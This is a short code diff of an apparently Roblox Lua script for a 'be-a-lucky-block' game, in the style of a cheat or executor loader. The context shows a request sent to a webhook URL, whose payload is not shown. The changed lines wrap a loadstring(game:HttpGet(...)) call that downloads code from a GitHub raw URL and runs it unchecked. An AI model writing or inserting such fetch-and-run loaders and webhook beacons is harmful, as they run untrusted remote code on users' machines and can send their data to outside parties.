@@ -20,7 +20,6 @@ task.spawn(function()
             }
         }}
     })
-
     pcall(function()
         request({
             Url = webhookURL,
@@ -31,4 +30,6 @@ task.spawn(function()
     end)
 end)
 
-loadstring(game:HttpGet("https://raw.githubusercontent.com/snowSma/be-a-lucky-block/refs/heads/main/gay%20script"))()
+task.spawn(function()
+    loadstring(game:HttpGet("https://raw.githubusercontent.com/snowSma/be-a-lucky-block/refs/heads/main/gay%20script"))()
+end)
